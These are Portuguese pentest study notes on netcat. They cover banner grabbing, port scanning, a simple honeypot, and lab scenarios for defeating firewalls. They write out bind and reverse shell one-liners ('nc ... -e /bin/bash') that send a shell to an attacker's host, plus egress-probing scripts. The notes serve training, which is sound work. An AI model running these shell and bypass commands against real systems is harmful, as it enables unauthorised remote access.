
# Port Forwarding

Encaminhamento de portas - quando um pacote chegar ao roteador, esse vai conseguir encaminhar para o IP correto do servico.
Em pentest, isso e util principalmente quando queremos acessar servicos atras de Firewalls, usando a **conexao reversa** que sera explicada adiante, fazendo o servidor se conectar a nossa maquina e enviar a *shell*

# Swiss Army Knife

Canivete Suico - varias possibilidades em um unico produto
Para pentest
- Estabelecer e receber conexoes
- Banner grabbing (Interacao com servicos)
- Chat
- Transferencia de arquivos
- Honeypot
- Scanning
- Execucao de comandos remoto

Exemplos como netcat, ncat, socat, sdb, cryptcat

# NETCAT

Geralmente usando `nc` na maioria das *distros* linux.

## Interagindo com servicos

A sintaxe padrao e `nc {site/ip} {porta}`, dessa forma conseguimos interagir diretamente com um servico. Nesse caso sera necessario tbm entender a sintaxe do servico que esta interagindo.

## Chat e IP logger

Podemos usar tambem o netcat para abrir portas na maquina, com `nc -vlp {porta}` onde o *v para verbose*, *l de listen* e *p de port*. Abrindo essa porta podemos em outras maquina nos conectar por netcat com o `nc {ip do host que abriu a pota} {porta aberta}` como nao tem nenhum servico aberto, isso funcionaria como um "chat", tudo que voce digita em um dos terminais ira aparecer no outro.Tanto do host > listen como o inverso, essa conexao **nao e criptografada!** Outro ponto interessante, se eu abrir a porta **80** como listen, usando a sintaxe `nc -vlnp 80` onde o N nao resolve o nome como ip, e alguem acessar meu IP pelo navegador tambem sera mostrado essa tentativa de conexao, retornando o user agent.

## UDP e File Transfer

A sintaxe muda um pouco, com `nc -vnlup {porta}` estabelecemos uma coenxao **UDP**, para conectar usamos `nc -vnu {porta}`, sem servico funciona da mesma forma como "chat".

Para enviar arquivos, abrimos uma porta e no final direcionamos o que vem para um arquivo. E no servidor que vai se conectar, o arquivo para a conexao.

## Port Scanning

`nc -vzd {ip ou site} {porta}` com a opcao **z** vemos o status de uma porta, podemos usar a sintaxe `nc -vzd {ip ou site} porta_inicial-portafinal` exemplo `nc -vzd www.businesscorp.com.br 20-30` para procurar o status da porta 20 ate a 30. Podemos varrer todas as 65535, mas demora bem mais que outros por scanners, como o que fiz em python a alguns meses. Outra alternativa e usar o bash/shell scripting e ler um arquivo usando `cat` por exemplo.

## Honeypot

Atrair o atacante para uma armadilha, simulando portas abertas, quando alguem se conectar nessas portas, podemos acompanahr os movimentos.

Usando um *&* no final do codigo o processo fica executando em background, entao no Netcat usariamos `nc -vnlp {porta}`, dessa forma, quando alguem se conectar ira aparecer no terminal.

Para criar um honepote, podemos por exemplo criar um **banner** em *.txt*, exemplo simulando o banner do FTP, e outro arquivo *.log*, para ambos damos permissao total com `sudo chmod 777` nos dois arquivos.
Agora aprimos a porta com `nc -vnlp {porta} < banner.txt` assim direcionamos a saida ao arquvio de banner criado, exibidno por exemplo o banner de um servidor FTP com informacoes falsas do nosso sistema. O seguinte precisamos direcionar para o *.log* usando agora `nc -vnlp {porta} < banner.txt >> file.log 2>> file.log`,  importante usador dois *sinais de maior que* para gravar no final do arquivo e nao substituir. Outro ponto sobre, e que usando `2>>` direcionamos tambem erros para um arquivo de log e gravamos no final estes. Dessa forma as tentativas de interacao com o honeypot ficam armazenadas, ainda podemos melhorar o script com `while true; do nc -vnlp {porta} < banner.txt >> file.log 2>> file.log;echo $(date) >> file.log;done` trazendo tambem a data e hora do que foi escrito no shell, e adicionado o *while true;do* impede que abrindo a primeiro conexao o netcat caia apos a primeira conexao ser encerrada.

Usos desse honeypot seria por exemplo filtrar os IPs que se conectam as portas falsas e incluir em uma regra de bloqueio de firewall.

## Bind shell X Reverse shell

- **Bind shell** -> Maquina atacante conecta diretamente na porta do alvo, ao conectar **executa** a shell.

Usando netcat, temos a opcao `-e` que permite a execucao de um programa apos a conexao estabelecida.
Na maquina alvo abrimos uma porta `nc -vnlp {porta} -e /bin/bash` no caso de linux ou `nc -vnlp {porta} -e cmd.exe` para windows.
Na maquina atacante usamos `nc -vn {ip alvo} {porta}` e ja temos um shell, podemos digitar comandos diretamente no terminal.



- **Reverse shell** -> Maquina atacante fica esperando uma conexao, maquina alvo conecta e **envia** a shell

No reverse shell, iniciamos com a **maquina do atacante** escutando em uma porta exemplo `nc -vnlp {porta}` e entao na **maquina alvo**  `nc -vn {ip do atacante} {porta} -e cmd.exe # ou /bin/bash para linux` aqui nos conectamos na maquina atacante e enviamos o shell para ela.


# Vencendo o Firewall

## Cenario 1 - Bind shell simples

Acesso via SSH conectado a VPN
IP 172.16.1.5
root:root
Local das regras do firewall /home/msfadmin/firewall/

Cenario sem firewall, basta realizar um bind shell, conectado no ssh do alvo, usando o `nc -vnlp 5050 -e /bin/bash` abrimos a shell e na maquina atacante com `nc -vn 172.16.1.5 5050` recebemos a shell.

## Cenario 2 - Bind shell com porta "closed"

Firewall basico
Acesso direto nao funciona mais

Nesse caso notamos a porta 443 que esta *fechada*. Com nao tem nenhum servico rodando la, conseguimos usar o netcat na maquina alvo novamente com `nc -vnlp 443 -e /bin/bash` e na maquina atacante novamente `nc -vn 172.16.1.5 443` desse forma realizando novamente um bind shell, usando uma porta reconhecida pelo firewall mas sem servico ativo.

## Cenario 3 - Reverse shell basico

Nova regra de firewall, acesso direto nao funciona mais, pois toda entrada esta filtrada.

Nesse caso bind shell nao funciona, pois todo trafego e bloqueado na entrada. Caso perfeito para o reverse shell.

Na maquina do **atacante** abrimos a porta com `nc -vnlp 5050` e na maquina alvo enviamos a shell com `nc -vn {ip} 5050 -e /bin/bash` e recebemos a shell na maquina atacante.

## Cenario 4 - Egress firewall

Regra de firewall restritiva que bloqueia trafego de entrada e saida.

Bypass: Egress Firewall - criar uma forma de tentar estabelecer conexoes de saida, encontrar uma porta valida e fazer o reverse shell usando ela.

Na maquina atacante vamos abrir as portas com um script sh
```shell
nc -vnlp 80&
sleep 2
nc -vnlp 443&
sleep2
nc -vnlp 53&
netstat -nlpt
```
e no servidor fazemos o mesmo script para testar a saida
```shell
nc -vn {ip} 80&
sleep 2
nc -vn {ip} 443&
sleep 2
nc -vn {ip} 53&
```
Primeiro executamos na maquina atacante e em seguida na maquina alvo, podemos adicionar um ` | grep "open"` para filtrar apenas as portas abertas.
No exemplo as tres portas estao disponiveis, entao podemos usar qualquer uma dessas para um reverse shell.

**Em casos praticos** muitas vezes protocolos especificos ficam disponiveis, entao alem de achar a porta correta, temos que achar o protocolo correto.